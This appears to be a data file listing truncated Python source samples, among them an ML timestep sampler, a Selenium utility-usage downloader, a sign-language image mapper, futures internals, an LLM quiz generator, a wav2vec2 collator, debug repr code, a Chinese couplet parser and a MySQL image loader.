truncate the list\n        samples = samples[:target_size]\n        return th.tensor(samples)\n\n    def sample(self, x1, sp_timesteps=None, shifted_mu=0):\n        \"\"\"Sampling x0 & t based on shape of x1 (if needed)\n          Args:\n            x1 - data point; [batch, *dim]\n        \"\"\"\n        \n        x0 = th.randn_like(x1)\n        t0, t1 = self.check_interval(self.train_eps, self.sample_eps)\n        if not self.use_lognorm:\n            if self.partitial_train is not None and th.rand(1) < self.partial_ratio:\n                t = th.rand((x1.shape[0],)) * (self.partitial_train[1] - self.partitial_train[0]) + self.partitial_train[0]\n            else:\n                t = th.rand((x1.shape[0],)) * (t1 - t0) + t0\n        else:\n            # random < partial_ratio, then sample from the partial range\n            if not self.shift_lg:\n                if self.partitial_train is not None and th.rand(1) < self.partial_ratio:\n                    t = self.sample_in_range(0, 1, x1.shape[0], range_min=self.partitial_train[0], range_max=self.partitial_train[1])\n                else:\n                    t = self.sample_logit_normal(0, 1, size=x1.shape[0]) * (t1 - t0) + t0\n            else:\n                assert self.partitial_train is None, \"Shifted lognormal ",
    "#! /usr/bin/python\n# Generated by Selenium IDE\nimport time\nimport sys\nimport os\nimport enum\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.common.action_chains import ActionChains\nfrom selenium.webdriver.support import expected_conditions as EC\nfrom selenium.webdriver.support.wait import WebDriverWait\nfrom selenium.webdriver.common.keys import Keys\nfrom selenium.webdriver.common.desired_capabilities import DesiredCapabilities\nfrom selenium.webdriver.firefox.options import Options\nfrom selenium.webdriver.firefox.service import Service\n\nclass ScrapeFormat(enum.Enum):\n    XLSX=0\n    XML=1\n\nclass Scraper:\n    def __init__(self, email: str, password: str, format: ScrapeFormat, download_dir: str):\n        self.email = email\n        self.password = password\n        self.format = format\n        self.download_dir = download_dir\n\n    def run(self):\n        # Setup firefox\n        options = Options()\n        options.set_preference(\"browser.download.folderList\", 2)\n        options.set_preference(\"browser.download.manager.showWhenStarting\", False)\n        options.set_preference(\"browser.download.dir\", self.download_dir)\n        options.add_argument(\"--headless\")\n\n        service = Service()\n        self.driver = webdriver.Firefox(options=options, service=service)\n\n        # Set start page\n        self.driver.get(\n            \"https://login.dominionenergy.com/CommonLogin?SelectedAppName=electric\"\n        )\n        self.driver.set_window_size(1762, 1923)\n\n        self.driver.find_element(By.CSS_SELECTOR, \"html\").click()\n\n        self.driver.implicitly_wait(50)\n        wait = WebDriverWait(self.driver, 50)\n\n        # Login\n        selector = (By.CSS_SELECTOR, \"input[name='username'][id]\")\n        wait.until(EC.element_to_be_clickable(selector))\n        username_field = self.driver.find_element(*selector)\n        username_field.click()\n        username_field.send_keys(self.email)\n\n        selector = By.CSS_SELECTOR, \"input[name='password'][id]\"\n        wait.until(EC.element_to_be_clickable(selector))\n        password_field = self.driver.find_element(*selector)\n        password_field.click()\n        password_field.send_keys(self.password)\n\n        selector = (By.CSS_SELECTOR, \"#gigya-login-form .gigya-input-submit\")\n        wait.until(EC.element_to_be_clickable(selector))\n        self.driver.find_element(*selector).click()\n\n        # Setup wait for loading overlay\n        def wait_loading_bg():\n            loaders = self.driver.find_elements(By.CSS_SELECTOR, \"div.loading-bg\")\n            for i in loaders:\n                wait.until(EC.invisibility_of_element(i))\n\n        # Click view usage\n        selector = (By.LINK_TEXT, \"View Your Usage\")\n        wait_loading_bg()\n        wait.until(EC.element_to_be_clickable(selector))\n        wait_loading_bg()\n        view_usage = self.driver.find_element(*selector)\n        view_usage.click()\n\n        ## Apparently green button download will download all data ever, regardless of selection\n        ## CSV has more granularity than green button\n        # Select daily stats\n        selector = (By.CSS_SELECTOR, \"#id7 + div\")\n        wait_loading_bg()\n        wait.until(EC.element_to_be_clickable(selector))\n        wait_loading_bg()\n        daily_sel = self.driver.find_element(*selector)\n        daily_sel.click()\n\n        if self.format == ScrapeFormat.XLSX:\n            selector = (By.PARTIAL_LINK_TEXT, \"Download 30-minute Data\")\n        else:\n            selector = (By.LINK_TEXT, \"Green Button\")\n        wait_loading_bg()\n        wait.until(EC.element_to_be_clickable(selector))\n        wait_loading_bg()\n        self.driver.find_element(*selector).click()\n\n        time.sleep(30)\n\n        self.driver.quit()\n\n\nif __name__ == \"__main__\":\n    Scraper(email=sys.argv[1], password=sys.argv[2], format=ScrapeFormat.XLSX, download_dir=os.getcwd()).run()\n",
    "import os\nfrom PIL import Image\nimport base64\nfrom io import BytesIO\n\nSIGN_LANGUAGE_IMAGES = {\n    'A': 'datasets/letter_images/A.png',\n    'B': 'datasets/letter_images/B.png',\n    'C': 'datasets/letter_images/C.png',\n    'D': 'datasets/letter_images/D.png',\n    'E': 'datasets/letter_images/E.png',\n    'F': 'datasets/letter_images/F.png',\n    'G': 'datasets/letter_images/G.png',\n    'H': 'datasets/letter_images/H.png',\n    'I': 'datasets/letter_images/I.png',\n    'J': 'datasets/letter_images/J.png',\n    'K': 'datasets/letter_images/K.png',\n    'L': 'datasets/letter_images/L.png',\n    'M': 'datasets/letter_images/M.png',\n    'N': 'datasets/letter_images/N.png',\n    'O': 'datasets/letter_images/O.png',\n    'P': 'datasets/letter_images/P.png',\n    'Q': 'datasets/letter_images/Q.png',\n    'R': 'datasets/letter_images/R.png',\n    'S': 'datasets/letter_images/S.png',\n    'T': 'datasets/letter_images/T.png',\n    'U': 'datasets/letter_images/U.png',\n    'V': 'datasets/letter_images/V.png',\n    'W': 'datasets/letter_images/W.png',\n    'X': 'datasets/letter_images/X.png',\n    'Y': 'datasets/letter_images/Y.png',\n    'Z': 'datasets/letter_images/Z.png',\n    ' ': None\n}\n\ndef get_image_base64(image_path):\n    if image_path:\n        with Image.open(image_path) as img:\n            buffered = BytesIO()\n            img.save(buffered, format=\"PNG\")\n            img_str = base64.b64encode(buffered.getvalue()).decode()\n            return img_str\n    return None\n\ndef text_to_sign_language(text):\n    text = text.upper()\n    images_data = []\n    \n    for char in text:\n        if char in SIGN_LANGUAGE_IMAGES:\n            img_path = SIGN_LANGUAGE_IMAGES[char]\n            if img_path:\n                img_base64 = get_image_base64(img_path)\n                images_data.append({\n                    'character': char,\n                    'image': img_base64\n                })\n            else:\n                images_data.append({\n                    'character': 'space',\n                    'image': None\n                })\n        else:\n            print(f\"Character '{char}' not found in dictionary.\")\n            \n    return images_data\n",
    "# Copyright 2009 Brian Quinlan. All Rights Reserved.\r\n# Licensed to PSF under a Contributor Agreement.\r\n\r\n__author__ = 'Brian Quinlan (brian@sweetapp.com)'\r\n\r\nimport collections\r\nimport logging\r\nimport threading\r\nimport time\r\nimport types\r\n\r\nFIRST_COMPLETED = 'FIRST_COMPLETED'\r\nFIRST_EXCEPTION = 'FIRST_EXCEPTION'\r\nALL_COMPLETED = 'ALL_COMPLETED'\r\n_AS_COMPLETED = '_AS_COMPLETED'\r\n\r\n# Possible future states (for internal use by the futures package).\r\nPENDING = 'PENDING'\r\nRUNNING = 'RUNNING'\r\n# The future was cancelled by the user...\r\nCANCELLED = 'CANCELLED'\r\n# ...and _Waiter.add_cancelled() was called by a worker.\r\nCANCELLED_AND_NOTIFIED = 'CANCELLED_AND_NOTIFIED'\r\nFINISHED = 'FINISHED'\r\n\r\n_FUTURE_STATES = [\r\n    PENDING,\r\n    RUNNING,\r\n    CANCELLED,\r\n    CANCELLED_AND_NOTIFIED,\r\n    FINISHED\r\n]\r\n\r\n_STATE_TO_DESCRIPTION_MAP = {\r\n    PENDING: \"pending\",\r\n    RUNNING: \"running\",\r\n    CANCELLED: \"cancelled\",\r\n    CANCELLED_AND_NOTIFIED: \"cancelled\",\r\n    FINISHED: \"finished\"\r\n}\r\n\r\n# Logger for internal use by the futures package.\r\nLOGGER = logging.getLogger(\"concurrent.futures\")\r\n\r\nclass Error(Exception):\r\n    \"\"\"Base class for all future-related exceptions.\"\"\"\r\n    pass\r\n\r\nclass CancelledError(Error):\r\n    \"\"\"The Future was cancelled.\"\"\"\r\n    pass\r\n\r\nTimeoutError = TimeoutError  # make local alias for the standard exception\r\n\r\nclass InvalidStateError(Error):\r\n    \"\"\"The operation is not allowed in this state.\"\"\"\r\n    pass\r\n\r\nclass _Waiter(object):\r\n    \"\"\"Provides the event that wait() and as_completed() block on.\"\"\"\r\n    def __init__(self):\r\n        self.event = threading.Event()\r\n        self.finished_futures = []\r\n\r\n    def add_result(self, future):\r\n        self.finished_futures.append(future)\r\n\r\n    def add_exception(self, future):\r\n        self.finished_futures.append(future)\r\n\r\n    def add_cancelled(self, future):\r\n        self.finished_futures.append(future)\r\n\r\nclass _AsCompletedWaiter(_Waiter):\r\n    \"\"\"Used by as_completed().\"\"\"\r\n\r\n    def __init__(self):\r\n        super(_AsCompletedWaiter, self).__init__()\r\n        self.lock = threading.Lock()\r\n\r\n    def add_result(self, future):\r\n        with self.lock:\r\n            super(_AsCompletedWaiter, self).add_result(future)\r\n            self.event.set()\r\n\r\n    def add_exception(self, future):\r\n        with self.lock:\r\n            super(_AsCompletedWaiter, self).add_exception(future)\r\n            self.event.set()\r\n\r\n    def add_cancelled(self, future):\r\n        with self.lock:\r\n            super(_AsCompletedWaiter, self).add_cancelled(future)\r\n            self.event.set()\r\n\r\nclass _FirstCompletedWaiter(_Waiter):\r\n    \"\"\"Used by wait(return_when=FIRST_COMPLETED).\"\"\"\r\n\r\n    def add_result(self, future):\r\n        super().add_result(future)\r\n        self.event.set()\r\n\r\n    def add_exception(self, future):\r\n        super().add_exception(future)\r\n        self.event.set()\r\n\r\n    def add_cancelled(self, future):\r\n        super().add_cancelled(future)\r\n        self.event.set()\r\n\r\nclass _AllCompletedWaiter(_Waiter):\r\n    \"\"\"Used by wait(return_when=FIRST_EXCEPTION and ALL_COMPLETED).\"\"\"\r\n\r\n    def __init__(self, num_pending_calls, stop_on_exception):\r\n        self.num_pending_calls = num_pending_calls\r\n        self.stop_on_exception = stop_on_exception\r\n        self.lock = threading.Lock()\r\n        super().__init__()\r\n\r\n    def _decrement_pending_calls(self):\r\n        with self.lock:\r\n            self.num_pending_calls -= 1\r\n            if not self.num_pending_calls:\r\n                self.event.set()\r\n\r\n    def add_result(self, future):\r\n        super().add_result(future)\r\n        self._decrement_pending_calls()\r\n\r\n    def add_exception(self, future):\r\n        super().add_exception(future)\r\n        if self.stop_on_exception:\r\n            self.event.set()\r\n        else:\r\n            self._decrement_pending_calls()\r\n\r\n    def add_cancelled(self, future):\r\n        super().add_cancelled(future)\r\n        self._decrement_pending_calls()\r\n\r\nclass _AcquireFutures(object):\r\n    \"\"\"A context manager that does an ordered acquire of Future conditions.\"\"\"\r\n\r\n    def __init__(self, futures):\r\n        self.futures = sorted(futures, key=id)\r\n\r\n    def __enter__(self):\r\n        for future in self.futures:\r\n            future._condition.acquire()\r\n\r\n    def __exit__(self, *args):\r\n        for future in self.futures:\r\n            future._condition.release()\r\n\r\ndef _create_and_install_waiters(fs, return_when):\r\n    if return_when == _AS_COMPLETED:\r\n        waiter = _AsCompletedWaiter()\r\n    elif return_when == FIRST_COMPLETED:\r\n        waiter = _FirstCompletedWaiter()\r\n    else:\r\n        pending_count = sum(\r\n                f._state not in [CANCELLED_AND_NOTIFIED, FINISHED] for f in fs)\r\n\r\n        if return_when == FIRST_EXCEPTION:\r\n            waiter = _AllCompletedWaiter(pending_count, stop_on_exception=True)\r\n        elif return_when == ALL_COMPLETED:\r\n            waiter = _AllCompletedWaiter(pending_count, stop_on_exception=False)\r\n        else:\r\n            raise ValueError(\"Invalid",
    "from mistralai import Mistral\nimport json\nimport os\nfrom getpass import getpass\nimport streamlit as st\n\n# Generate Quiz\nfrom mistralai import Mistral\nimport os\n\n\n\n# Initialize Mistral client\napi_key = os.getenv(\"MISTRAL_API_KEY\") or getpass(\"Enter Mistral API Key: \")\nclient = Mistral(api_key=api_key)\n\n# Generate Summary\n@st.cache_data\ndef generate_summary(content):\n    messages = [\n        {\n            \"role\": \"user\",\n            \"content\": (\n                \"You are a professional summarization assistant. Your task is to provide a structured summary for the given document \"\n                \"and output it in JSON format with the following keys:\\n\"\n                \"- `summary`: A concise summary of the document (150-200 words).\\n\"\n                \"- `key_skills`: A list of key skills required to learn or understand the content.\\n\"\n                \"- `difficulty`: The estimated difficulty level (Easy, Medium, or Hard) for a STEM college student.\\n\"\n                \"- `estimated_time`: The estimated time (in minutes) required for a STEM college student to read and thoroughly comprehend the document.\\n\\n\"\n                \"#### Few-shot Examples:\\n\"\n                \"Example 1:\\n\"\n                \"```\\n\"\n                \"{\\n\"\n                \"  \\\"summary\\\": \\\"This document discusses the fundamentals of machine learning, including supervised, unsupervised, \"\n                \"and reinforcement learning. It provides an overview of common algorithms, such as linear regression, k-means clustering, \"\n                \"and Q-learning, along with their applications in various industries like healthcare, finance, and technology.\\\",\\n\"\n                \"  \\\"key_skills\\\": [\\\"Basic programming knowledge\\\", \\\"Understanding of mathematical concepts (e.g., linear algebra, statistics)\\\", \\\"Familiarity with algorithms\\\"],\\n\"\n                \"  \\\"difficulty\\\": \\\"Intermediate\\\",\\n\"\n                \"  \\\"estimated_time\\\": 45\\n\"\n                \"}\\n\"\n                \"```\\n\\n\"\n                \"Example 2:\\n\"\n                \"```\\n\"\n                \"{\\n\"\n                \"  \\\"summary\\\": \\\"This document introduces the principles of cybersecurity, including common threats such as phishing, malware, \"\n                \"and ransomware. It outlines strategies for securing systems and data, such as using encryption, firewalls, and multifactor authentication.\\\",\\n\"\n                \"  \\\"key_skills\\\": [\\\"Basic understanding of networking\\\", \\\"Knowledge of encryption techniques\\\", \\\"Awareness of common cybersecurity threats\\\"],\\n\"\n                \"  \\\"difficulty\\\": \\\"Beginner\\\",\\n\"\n                \"  \\\"estimated_time\\\": 30\\n\"\n                \"}\\n\"\n                \"```\\n\\n\"\n                \"#### Document Content:\\n\"\n                f\"{content[:4000]}\"\n            ),\n        }\n    ]\n    response = client.chat.complete(\n        model=\"pixtral-12b-2409\",  # Replace with your chosen free model\n        messages=messages,\n        temperature=0.7,\n        response_format={\"type\": \"json_object\"},  # Enforce JSON response\n        max_tokens=2000,\n    )\n\n    return response.choices[0].message.content\n\n\n\n@st.cache_data\ndef generate_quiz(content, num_questions=10, difficulty=\"Medium\", include_explanations=False):\n    \"\"\"\n    Generates a quiz based on the provided content using the Mistral model.\n\n    Args:\n        content (str): The content to generate quiz questions from.\n        num_questions (int): The number of questions to generate.\n        difficulty (str): The difficulty level of the questions (\"Easy\", \"Medium\", \"Hard\").\n        include_explanations (bool): Whether to include explanations for the answers.\n\n    Returns:\n        list: A list of quiz questions in the specified format.\n    \"\"\"\n    try:\n        # Additional instruction for including explanations\n        explanation_text = \"Provide explanations for each correct answer.\" if include_explanations else \"\"\n\n        # Construct the message for the model\n        messages = [\n            {\n                \"role\": \"user\",\n                \"content\": (\n                    f\"You are a Teacher/Professor creating a quiz to test understanding of the provided content. \"\n                    f\"Your task is to generate **{num_questions} {difficulty.lower()}-level multiple-choice questions** based on the content. \"\n                    f\"Each question should have **4 options**, with **one correct answer clearly labeled**. Ensure the questions \"\n                    f\"are diverse, engaging, and span across different aspects of the content to comprehensively test knowledge.\\n\\n\"\n                    f\"{explanation_text}\\n\\n\"\n                    \"#### Instructions:\\n\"\n                    \"- Write each question clearly and concisely.\\n\"\n                    \"- Provide 4 options for each question, ensuring the options are plausible.\\n\"\n                    \"- Mark the correct answer explicitly in the specified format.\\n\"\n                    \"\\n\"\n                    \"#### Output Format:\\n\"\n                    \"Provide the out",
    "from dataclasses import dataclass\nfrom typing import Dict, List, Optional, Union\nimport torch\nfrom tqdm.auto import tqdm\nfrom transformers import Wav2Vec2FeatureExtractor, Wav2Vec2ForPreTraining\nfrom transformers.models.wav2vec2.modeling_wav2vec2 import _compute_mask_indices, _sample_negative_indices\n\n\n@dataclass\nclass DataCollatorForWav2Vec2Pretraining:\n    \"\"\"\n    Data collator that will dynamically pad the inputs received and prepare masked indices\n    for self-supervised pretraining.\n\n    Args:\n        model (:class:`~transformers.Wav2Vec2ForPreTraining`):\n            The Wav2Vec2 model used for pretraining. The data collator needs to have access\n            to config and ``_get_feat_extract_output_lengths`` function for correct padding.\n        feature_extractor (:class:`~transformers.Wav2Vec2FeatureExtractor`):\n            The processor used for proccessing the data.\n        padding (:obj:`bool`, :obj:`str` or :class:`~transformers.tokenization_utils_base.PaddingStrategy`, `optional`, defaults to :obj:`True`):\n            Select a strategy to pad the returned sequences (according to the model's padding side and padding index)\n            among:\n            * :obj:`True` or :obj:`'longest'`: Pad to the longest sequence in the batch (or no padding if only a single\n              sequence if provided).\n            * :obj:`'max_length'`: Pad to a maximum length specified with the argument :obj:`max_length` or to the\n              maximum acceptable input length for the model if that argument is not provided.\n            * :obj:`False` or :obj:`'do_not_pad'` (default): No padding (i.e., can output a batch with sequences of\n              different lengths).\n        max_length (:obj:`int`, `optional`):\n            Maximum length of the ``input_values`` of the returned list and optionally padding length (see above).\n        pad_to_multiple_of (:obj:`int`, `optional`):\n            If set will pad the sequence to a multiple of the provided value.\n            This is especially useful to enable the use of Tensor Cores on NVIDIA hardware with compute capability >=\n            7.5 (Volta).\n        mask_time_prob (:obj:`float`, `optional`, defaults to :obj:`0.65`):\n            Percentage (between 0 and 1) of all feature vectors along the time axis which will be masked for the contrastive task.\n            Note that overlap between masked sequences may decrease the actual percentage of masked vectors.\n            The default value is taken from the original wav2vec 2.0 article (https://arxiv.org/abs/2006.11477),\n            and results in about 49 percent of each sequence being masked on average.\n        mask_time_length (:obj:`int`, `optional`, defaults to :obj:`10`):\n            Length of each vector mask span to mask along the time axis in the contrastive task. The default value\n            originates from the original wav2vec 2.0 article and corresponds to the ``M`` variable mentioned there.\n    \"\"\"\n\n    model: Wav2Vec2ForPreTraining\n    feature_extractor: Wav2Vec2FeatureExtractor\n    padding: Union[bool, str] = \"longest\"\n    pad_to_multiple_of: Optional[int] = None\n    mask_time_prob: Optional[float] = 0.65\n    mask_time_length: Optional[int] = 10\n\n    def __call__(self, features: List[Dict[str, Union[List[int], torch.Tensor]]]) -> Dict[str, torch.Tensor]:\n        # reformat list to dict and set to pytorch format\n        batch = self.feature_extractor.pad(\n            features,\n            padding=self.padding,\n            pad_to_multiple_of=self.pad_to_multiple_of,\n            return_tensors=\"pt\",\n        )\n\n        device = batch[\"input_values\"].device\n        batch_size = batch[\"input_values\"].shape[0]\n\n        mask_indices_seq_length = self.model._get_feat_extract_output_lengths(batch[\"input_values\"].shape[-1])\n        # make sure masked sequence length is a Python scalar\n        mask_indices_seq_length = int(mask_indices_seq_length)\n\n        # make sure that no loss is computed on padded inputs\n        if batch.get(\"attention_mask\") is not None:\n            # compute real output lengths according to convolution formula\n            batch[\"sub_attention_mask\"] = self.model._get_feature_vector_attention_mask(\n                mask_indices_seq_length, batch[\"attention_mask\"]\n            )\n\n        features_shape = (batch_size, mask_indices_seq_length)\n\n        # sample randomly masked indices\n        mask_time_indices = _compute_mask_indices(\n            features_shape,\n            self.mask_time_prob,\n            self.mask_time_length,\n            attention_mask=batch.get(\"sub_attention_mask\"),\n        )\n\n        # sample negative indices\n        sampled_negative_indices = _sample_negative_indices(\n            features_shape,\n            self.model.config.num_negatives,\n            mask_time_indices=mask_time_indices,\n        )\n        batch[\"mask_time_indices\"] = torch.tensor(mask_time_indices, dtype=torch.long, device=device)\n        batch[\"sampled_negative_indices\"] = torch.tensor(sampled_negative_indices, d",
    "\"\"\"Object representations for debugging purposes. Unlike the default\nrepr, these expose more information and produce HTML instead of ASCII.\n\nTogether with the CSS and JavaScript of the debugger this gives a\ncolorful and more compact output.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport codecs\nimport re\nimport sys\nimport typing as t\nfrom collections import deque\nfrom traceback import format_exception_only\n\nfrom markupsafe import escape\n\nmissing = object()\n_paragraph_re = re.compile(r\"(?:\\r\\n|\\r|\\n){2,}\")\nRegexType = type(_paragraph_re)\n\nHELP_HTML = \"\"\"\\\n<div class=box>\n  <h3>%(title)s</h3>\n  <pre class=help>%(text)s</pre>\n</div>\\\n\"\"\"\nOBJECT_DUMP_HTML = \"\"\"\\\n<div class=box>\n  <h3>%(title)s</h3>\n  %(repr)s\n  <table>%(items)s</table>\n</div>\\\n\"\"\"\n\n\ndef debug_repr(obj: object) -> str:\n    \"\"\"Creates a debug repr of an object as HTML string.\"\"\"\n    return DebugReprGenerator().repr(obj)\n\n\ndef dump(obj: object = missing) -> None:\n    \"\"\"Print the object details to stdout._write (for the interactive\n    console of the web debugger.\n    \"\"\"\n    gen = DebugReprGenerator()\n    if obj is missing:\n        rv = gen.dump_locals(sys._getframe(1).f_locals)\n    else:\n        rv = gen.dump_object(obj)\n    sys.stdout._write(rv)  # type: ignore\n\n\nclass _Helper:\n    \"\"\"Displays an HTML version of the normal help, for the interactive\n    debugger only because it requires a patched sys.stdout.\n    \"\"\"\n\n    def __repr__(self) -> str:\n        return \"Type help(object) for help about object.\"\n\n    def __call__(self, topic: t.Any | None = None) -> None:\n        if topic is None:\n            sys.stdout._write(f\"<span class=help>{self!r}</span>\")  # type: ignore\n            return\n        import pydoc\n\n        pydoc.help(topic)\n        rv = sys.stdout.reset()  # type: ignore\n        paragraphs = _paragraph_re.split(rv)\n        if len(paragraphs) > 1:\n            title = paragraphs[0]\n            text = \"\\n\\n\".join(paragraphs[1:])\n        else:\n            title = \"Help\"\n            text = paragraphs[0]\n        sys.stdout._write(HELP_HTML % {\"title\": title, \"text\": text})  # type: ignore\n\n\nhelper = _Helper()\n\n\ndef _add_subclass_info(inner: str, obj: object, base: type | tuple[type, ...]) -> str:\n    if isinstance(base, tuple):\n        for cls in base:\n            if type(obj) is cls:\n                return inner\n    elif type(obj) is base:\n        return inner\n    module = \"\"\n    if obj.__class__.__module__ not in (\"__builtin__\", \"exceptions\"):\n        module = f'<span class=\"module\">{obj.__class__.__module__}.</span>'\n    return f\"{module}{type(obj).__name__}({inner})\"\n\n\ndef _sequence_repr_maker(\n    left: str, right: str, base: type, limit: int = 8\n) -> t.Callable[[DebugReprGenerator, t.Iterable[t.Any], bool], str]:\n    def proxy(self: DebugReprGenerator, obj: t.Iterable[t.Any], recursive: bool) -> str:\n        if recursive:\n            return _add_subclass_info(f\"{left}...{right}\", obj, base)\n        buf = [left]\n        have_extended_section = False\n        for idx, item in enumerate(obj):\n            if idx:\n                buf.append(\", \")\n            if idx == limit:\n                buf.append('<span class=\"extended\">')\n                have_extended_section = True\n            buf.append(self.repr(item))\n        if have_extended_section:\n            buf.append(\"</span>\")\n        buf.append(right)\n        return _add_subclass_info(\"\".join(buf), obj, base)\n\n    return proxy\n\n\nclass DebugReprGenerator:\n    def __init__(self) -> None:\n        self._stack: list[t.Any] = []\n\n    list_repr = _sequence_repr_maker(\"[\", \"]\", list)\n    tuple_repr = _sequence_repr_maker(\"(\", \")\", tuple)\n    set_repr = _sequence_repr_maker(\"set([\", \"])\", set)\n    frozenset_repr = _sequence_repr_maker(\"frozenset([\", \"])\", frozenset)\n    deque_repr = _sequence_repr_maker(\n        '<span class=\"module\">collections.</span>deque([', \"])\", deque\n    )\n\n    def regex_repr(self, obj: t.Pattern[t.AnyStr]) -> str:\n        pattern = repr(obj.pattern)\n        pattern = codecs.decode(pattern, \"unicode-escape\", \"ignore\")\n        pattern = f\"r{pattern}\"\n        return f're.compile(<span class=\"string regex\">{pattern}</span>)'\n\n    def string_repr(self, obj: str | bytes, limit: int = 70) -> str:\n        buf = ['<span class=\"string\">']\n        r = repr(obj)\n\n        # shorten the repr when the hidden part would be at least 3 chars\n        if len(r) - limit > 2:\n            buf.extend(\n                (\n                    escape(r[:limit]),\n                    '<span class=\"extended\">',\n                    escape(r[limit:]),\n                    \"</span>\",\n                )\n            )\n        else:\n            buf.append(escape(r))\n\n        buf.append(\"</span>\")\n        out = \"\".join(buf)\n\n        # if the repr looks like a standard string, add subclass info if needed\n        if r[0] in \"'\\\"\" or (r[0] == \"b\" and r[1] in \"'\\\"\"):\n            return _add_subclass_info(out, obj, (bytes, str))\n\n        # otherwise, assume the repr distinguishes the subclass already\n        return ",
    "import json\nimport sys\nimport re\nimport os\n\n## \u8bad\u8499\u9a88\u53e5\ndef process_text(input_text):\n    # Split text into lines and remove empty lines\n    lines = [line.strip() for line in input_text.split('\\n') if line.strip()]\n    print(f'# of lines detected: {len(lines)}')\n    results = []\n    \n    for line in lines:\n        # Skip lines that are just punctuation or whitespace\n        if re.match(r'^[\u3000\\s\\u3000,.\u3002\uff0c\uff1b;]+$', line):\n            continue\n            \n        sentences = line.split('\u3002')\n        # remove empty strings\n        sentences = [sentence for sentence in sentences if sentence]\n        assert len(sentences) ==5, f\"Error: Expected 5 sentences per line, but got {len(sentences)} sentences\"\n        \n        for i in range(len(sentences)):\n            if i < 4:\n                couplets = sentences[i].split('\uff0c')\n                results.append({'0': couplets[0], '1': couplets[1]})\n            if i== 4:\n                couplets = sentences[-1].split('\uff1b')\n                results.append({'0': couplets[0], '1': couplets[1]})\n\n    return results\n\ndef main():\n    base_foldername = './\u539f\u6587'\n    # loop through the files in the folder\n    files = os.listdir(base_foldername)\n    assert len(files) == 30, f\"Error: Expected 30 files, but got {len(files)} files\"\n\n    for filename in files:\n        # Get the base filename (without extension)\n        base_filename = filename.split('.')[0]\n\n        input_filename = f\"{base_foldername}/{base_filename}.txt\"\n        output_filename = f\"dataset/{base_filename}.json\"\n        try:\n            # Check if input file exists\n            if not os.path.exists(input_filename):\n                print(f\"Error: Input file {input_filename} not found\")\n                sys.exit(1)\n            print(f\"Processing {input_filename}...\")\n\n            # Read input from text file\n            with open(input_filename, 'r', encoding='utf-8') as f:\n                input_text = f.read()\n\n            # Process the text\n            result = process_text(input_text)\n\n            # Write to JSON file\n            with open(output_filename, 'w', encoding='utf-8') as f:\n                json.dump(result, f, ensure_ascii=False, indent=4)\n\n        except Exception as e:\n            print(f\"Error: {str(e)}\")\n            sys.exit(1)\n\n    print(f\"Successfully processed {base_foldername}.\")\n\nif __name__ == \"__main__\":\n    main()",
    "import os\r\nimport mysql.connector\r\nfrom PIL import Image\r\nimport io\r\nfrom mysql.connector import Error\r\n\r\n\r\n# MySQL \u6570\u636e\u5e93\u8fde\u63a5\u53c2\u6570\r\ndb_config = {\r\n    'user': '',\r\n    'password': '',\r\n    'host': '',\r\n    'port': '',\r\n    'database': ''\r\n}\r\n\r\n\r\n# \u8fde\u63a5\u5230 MySQL \u6570\u636e\u5e93\r\ndef connect_to_db():\r\n    try:\r\n        connection = mysql.connector.connect(**db_config)\r\n        if connection.is_connected():\r\n            print(\"\u6210\u529f\u8fde\u63a5\u5230\u6570\u636e\u5e93\")\r\n            return connection\r\n    except Error as e:\r\n        print(f\"\u6570\u636e\u5e93\u8fde\u63a5\u5931\u8d25: {e}\")\r\n        return None\r\n\r\n\r\ndef store_images_to_db(table_name, folder_path):\r\n    conn = connect_to_db()\r\n    cursor = conn.cursor()\r\n\r\n    # \u904d\u5386\u6587\u4ef6\u5939\u4e2d\u7684\u6240\u6709\u6587\u4ef6\r\n    for filename in os.listdir(folder_path):\r\n        file_path = os.path.join(folder_path, filename)\r\n\r\n        # \u68c0\u67e5\u6587\u4ef6\u662f\u5426\u662f\u56fe\u7247\uff08\u53ef\u4ee5\u6839\u636e\u6269\u5c55\u540d\u8fdb\u884c\u68c0\u67e5\uff09\r\n        if os.path.isfile(file_path) and filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):\r\n            try:\r\n                # \u6253\u5f00\u56fe\u7247\u5e76\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u6570\u636e\r\n                with open(file_path, 'rb') as file:\r\n                    image_data = file.read()\r\n\r\n                # \u6ce8\u610f\u6539\u52a8\r\n                str_data = 'halflength'\r\n                image_name = filename.split(str_data)[0] + str_data\r\n                image_id = filename.split(str_data)[1].split('.')[0]\r\n                # \u63d2\u5165\u56fe\u7247\u6570\u636e\u5230\u6570\u636e\u5e93\r\n                cursor.execute(f\"INSERT INTO {table_name} (image_name, image_id, image_data) VALUES (%s, %s, %s)\",\r\n                               (image_name, image_id, image_data))\r\n                conn.commit()\r\n                print(f\"\u6210\u529f\u63d2\u5165 {image_name} \u5230\u6570\u636e\u5e93\")\r\n\r\n            except Exception as e:\r\n                print(f\"\u65e0\u6cd5\u5904\u7406\u6587\u4ef6 {filename}: {e}\")\r\n                continue\r\n\r\n    # \u63d0\u4ea4\u4e8b\u52a1\u5e76\u5173\u95ed\u8fde\u63a5\r\n    cursor.close()\r\n    conn.close()\r\n    print(\"\u6240\u6709\u56fe\u7247\u5df2\u6210\u529f\u5b58\u50a8\u5230\u6570\u636e\u5e93\u3002\")\r\n\r\n\r\ndef store_images_to_db_batch(table_name, folder_path):\r\n    conn = connect_to_db()\r\n    cursor = conn.cursor()\r\n\r\n    insert_data = []  # \u7528\u4e8e\u6279\u91cf\u63d2\u5165\u7684\u5217\u8868\r\n\r\n    # \u904d\u5386\u6587\u4ef6\u5939\u4e2d\u7684\u6240\u6709\u6587\u4ef6\r\n    for filename in os.listdir(folder_path):\r\n        file_path = os.path.join(folder_path, filename)\r\n\r\n        # \u68c0\u67e5\u6587\u4ef6\u662f\u5426\u662f\u56fe\u7247\r\n        if os.path.isfile(file_path) and filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):\r\n            try:\r\n                # \u6253\u5f00\u56fe\u7247\u5e76\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u6570\u636e\r\n                with open(file_path, 'rb') as file:\r\n                    image_data = file.read()\r\n                    # \u6ce8\u610f\u6539\u52a8\r\n                    image_name = filename.split('snapshot')[0] + 'snapshot'\r\n                    image_id = filename.split('snapshot')[1].split('.')[0]\r\n                # 